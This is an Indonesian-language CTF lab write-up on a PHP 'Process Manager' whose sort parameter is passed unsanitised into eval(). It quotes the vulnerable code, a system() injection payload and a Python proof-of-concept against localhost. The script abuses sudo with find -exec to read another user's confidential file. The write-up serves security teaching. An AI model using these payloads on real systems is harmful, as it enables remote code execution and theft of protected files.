---
title: Rahasia Joko
description: Writeup lab Rahasia Joko
tags:
  - input injection
  - code injection
  - rce
  - CTF
draft: false
---

## Summary
* Vuln Name: `eval()` Injection in Function Definition
* Type: Input Injection
* Impact: Remote Code Execution (RCE)
* Severity: Critical
* functionality: [[input-validation]], [[data-retrieval]]

## Metodologi dan Observasi
1. Pada aplikasi `Process Manager` ini, sebuah fungsionalitas pengurutan (sorting) tabel diimplementasikan. Pengurutan didasarkan pada argumen `order_by` yang disuplai melalui URL GET _parameter_.
2. Jika kita melihat kode sumber `index.php`, pengurutan tabel (*array*) multitingkat (*multidimensional*) dilakukan dengan membuat fungsi dinamis menggunakan *built-in function* `eval()`:
   ```php
   $order_by = $_GET['order_by'] ?? 'pid';
   $func_name = 'sorter_' . uniqid();
   $func_body = "return strcmp(\$a['$order_by'], \$b['$order_by']);";
   eval("function $func_name(\$a, \$b) { $func_body }");
   ```
3. Variabel `$order_by` tidak dikenai rutinitas pembersihan (tidak ada [[input-validation]]) dan interpolasi teks langsung terjadi di antara tanda kutip tunggal: `\$a['$order_by']`.
4. Jika parameter input kita manipulasi agar bernilai `pid']); } system('id'); //`, maka evaluasi string-nya akan terbentuk layaknya di bawah:
   ```php
   function sorter_60f...($a, $b) { return strcmp($a['pid']); } system('id'); //'], $b['pid']); } system('id'); //']); }
   ```
5. Pola sisipan kode (*payload*) yang merusak penyingkapan elemen _array_ ini lantas berakibat pada penutupan paksa fungsi logika asali (`}`) dan memungkinkan eksekusi injeksi kode PHP baru (`system()`).
6. Celah ini diklasifikasikan sebagai [[code-injection]]. Sama seperti kasus [[rahasia-bahlil]], penyerang yang lolos ke proses pengeksekusian _shell_ bisa mendapatkan flag yang dijaga dengan cara melakukan [[privilege-escalation]].

## PoC
Skrip di bawah merangkai _payload_ sedemikian rupa agar menghentikan interpretasi PHP yang diinisiasi lalu melancarkan _command_ mematikan untuk mengambil bendera rahasia milik _user_ `bahlul`.

```python
import requests
import re

url = "http://localhost:1337/"

# Menyusupkan injeksi penutup fungsi, melakukan privesc pencarian pada /home,
# dan lalu melumpur baris sintaks asli yang malang-melintang dengan '//'
payload = r"pid']); } system('sudo -u bahlul /usr/bin/find . -exec cat /home/bahlul/confidential.txt \; -quit 2>&1'); //"

params = {
    'order_by': payload
}

res = requests.get(url, params=params)

if "pwn{" in res.text:
    for line in res.text.split('\n'):
        if "pwn{" in line:
            print(f"[+] Flag found: {line.strip()}")
```

## Impact
Kegagalan validasi masukan pada konstruksi logika bahasa secara dinamis (*eval*) selalu bermuara pada level fatal, yakni [[remote-code-execution]] (RCE).
